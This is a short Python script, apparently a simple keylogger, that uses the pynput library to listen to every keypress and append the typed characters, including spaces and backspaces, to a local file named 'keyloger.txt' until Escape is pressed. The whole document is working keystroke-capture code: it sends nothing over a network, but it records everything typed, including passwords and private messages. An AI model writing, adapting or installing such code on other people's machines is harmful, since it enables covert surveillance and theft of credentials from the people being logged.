import pynput
from pynput.keyboard import Key , Listener
count = 0
keyss = []

def press(key):
    global count , keyss
    count += 1
    keyss.append(key)
    if count >= 0:
        writefile(keyss)
        keyss = []

def writefile(keys):
    with open("keyloger.txt" , "a" , encoding="utf-8") as file:
        for key in keys:
            r = str(key).replace("'", "")
            if r.find("space") > 0:
                file.write(" ")
            elif r.find("Key") == -1:
                file.write(r)
            elif r.find("backspace") > 0:
                file.write(r)

def release(key):
    if str(key) == 'Key.esc':
        print('Exiting...')
        return False


with Listener(on_press= press , on_release= release) as listener:
    listener.join()
    
